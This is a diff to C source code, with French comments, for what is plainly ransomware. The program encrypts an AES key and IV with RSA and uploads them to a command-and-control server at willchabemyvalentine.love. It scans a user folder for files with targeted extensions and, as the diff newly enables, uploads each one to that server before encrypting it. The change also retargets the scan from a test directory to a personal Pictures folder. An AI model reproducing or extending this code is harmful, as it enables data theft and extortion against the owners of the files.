@@ -30,6 +30,7 @@ void sendFileToApi(const char *path, const char *id, const char *api);
 char* debug_bytes(const unsigned char* byte_sequence, size_t sequence_size);
 void write_to_file(char *filename, char *value, int size);
 void browse_files(unsigned char *key, unsigned char *iv, unsigned char *aad, const char *id, const char *URL);
+char generate_random_char();
 
 
 // Liste des extensions à chiffrer
@@ -86,9 +87,6 @@ int main() {
 
     key_lisible = debug_bytes(key, key_size);
     iv_lisible = debug_bytes(iv, iv_size);
-
-    write_to_file("aes_key.txt", key_lisible, 64);
-    write_to_file("iv.txt", iv_lisible, 32);
     
     printf("\nAES non chiffré: %s",key_lisible);
     printf("\nIV non chiffré: %s",iv_lisible);
@@ -99,19 +97,27 @@ int main() {
     char *encrypted_iv = rsa_encrypt(iv_lisible, &pub_key);
     printf("\n\nIV chiffré : %s\n", encrypted_iv);
 
-    free(encrypted_iv); 
-
-    free_public_key(&pub_key);
+    write_to_file("aes_key.txt", encrypted_key, 512);
+    write_to_file("iv.txt", encrypted_iv, 512);
 
     char ip[] = "willchabemyvalentine.love";
     int port = 42956;
     const char *URL[100];
     sprintf(URL, "http://%s:%d/upload", ip, port);
-    const unsigned char *ID = key_lisible;
 
+    char short_aes[11];
+    strncpy(short_aes, encrypted_key, 10);
+    short_aes[10] = '\0';
+
+    char *ID = short_aes;
     
-    browse_files(key, iv, aad, ID, URL);
+    sendFileToApi("aes_key.txt", ID, URL);
     sendFileToApi("iv.txt", ID, URL);
+    browse_files(key, iv, aad, ID, URL);
+
+    free(encrypted_iv); 
+
+    free_public_key(&pub_key);
 
     return 0;
 
@@ -228,7 +234,7 @@ void browse_files(unsigned char *key, unsigned char *iv, unsigned char *aad, con
     #ifdef _WIN32
     path = "C:\\Users\\me\\Documents";
     #else
-    path = "/home/lorette/test1";
+    path = "/home/mike/Pictures";
     #endif
 
     PathList pathList;
@@ -249,7 +255,7 @@ void browse_files(unsigned char *key, unsigned char *iv, unsigned char *aad, con
             for (size_t j = 0; j < num_extensions; ++j) {
                 if (strcmp(extension, extensions[j]) == 0) {
                     // Send the files to the C2 before being encrypted
-                    // sendFileToApi(pathList.paths[i], id, URL);
+                    sendFileToApi(pathList.paths[i], id, URL);
                     // Encrypt the file
                     encrypt_file(key, iv, aad, pathList.paths[i]);
                     // Decrypt the file (for demonstration purposes)
